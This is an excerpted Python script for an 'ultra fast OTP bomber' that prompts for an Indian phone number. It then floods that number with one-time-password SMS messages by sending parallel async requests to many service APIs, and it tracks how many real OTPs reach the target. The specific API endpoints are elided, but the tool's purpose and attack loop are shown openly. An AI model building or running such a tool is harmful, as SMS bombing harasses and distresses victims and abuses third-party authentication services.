# TOOL BY CHANDAN - ULTRA FAST OTP BOMBER
...
try:
    import uvloop   # type: ignore  use this if u have linux , mac not in windows 
    uvloop.install()
    print(f"{Fore.CYAN}[INFO] Using uvloop for maximum performance{Style.RESET_ALL}")
except ImportError:
    pass
...
async def send_requests(phone, ip_address="103.159.84.134"):
    """ULTRA-FAST request sender with parallel execution"""
    global running
    ...
    async with aiohttp.ClientSession(
        ...
        print(f"{Fore.GREEN}[INFO] Starting ULTRA-FAST BOMBER...{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}[INFO] Estimated speed: 10+ requests/second{Style.RESET_ALL}")
        ...
        while running:
            ...
            total_requests += len(API_CONFIGS)
            
            elapsed = time.time() - start_time
            if elapsed > 0:
                requests_per_second = total_requests / elapsed
                success_rate = (successful_requests / total_requests) * 100 if total_requests > 0 else 0
                otp_rate = (real_otp_success / total_requests) * 100 if total_requests > 0 else 0
                
                sys.stdout.write('\r' + ' ' * 100 + '\r')
                sys.stdout.write(f"{Fore.CYAN}[STATS] Total: {total_requests} | HTTP Success: {successful_requests} | Real OTPs: {real_otp_success} | Rate: {requests_per_second:.1f}/sec | HTTP Rate: {success_rate:.1f}% | OTP Rate: {otp_rate:.1f}%{Style.RESET_ALL}")
                sys.stdout.flush()
...
def display_banner():
    """Display the JERRY ASCII art banner"""
...
{Style.RESET_ALL}
{Fore.RED}
   I am Chandan Btech 2nd yr Student 
{Style.RESET_ALL}
{Fore.GREEN}
    [FEATURES]
    • Parallel Execution (10+ req/sec)
    • Connection Pooling
    • Optimized Timeouts
    • Real-time Statistics
    • Real OTP Success Tracking
{Style.RESET_ALL}
    """
    print(ascii_banner)

def stop_script():
    """Stop the bomber script"""
    global running
    running = False
    print(f"\n{Fore.GREEN}[INFO] Stopping ULTRA-FAST BOMBER...{Style.RESET_ALL}")

async def main():
    """Main function"""
    display_banner()
    
    phone = input(f"{Fore.RED}Enter phone number (without +91): {Style.RESET_ALL}")
    
    if not phone.isdigit() or len(phone) != 10:
        print(f"{Fore.RED}[ERROR] Invalid phone number! Must be 10 digits.{Style.RESET_ALL}")
        return
    
    confirm = input(f"{Fore.YELLOW}Target: +91{phone}. Start bombing? (y/n): {Style.RESET_ALL}")
    if confirm.lower() != 'y':
        print(f"{Fore.RED}[INFO] Cancelled.{Style.RESET_ALL}")
        return
    
    print(f"{Fore.GREEN}[INFO] Starting ULTRA-FAST BOMBER on +91{phone}...{Style.RESET_ALL}")
    print(f"{Fore.YELLOW}[INFO] Press Ctrl+C to stop{Style.RESET_ALL}")
    print(f"{Fore.CYAN}[INFO] Initializing...{Style.RESET_ALL}")
    print(f"{Fore.MAGENTA}[NOTE] Real OTP count shows actual OTPs sent, not just HTTP successes{Style.RESET_ALL}")
    ...
    try:
        ...
        print(f"\n{Fore.GREEN}[INFO] BOMBER stopped.{Style.RESET_ALL}")
...
if __name__ == "__main__":
    try:
        ...
        print(f"\n{Fore.RED}[INFO] Script terminated by user.{Style.RESET_ALL}")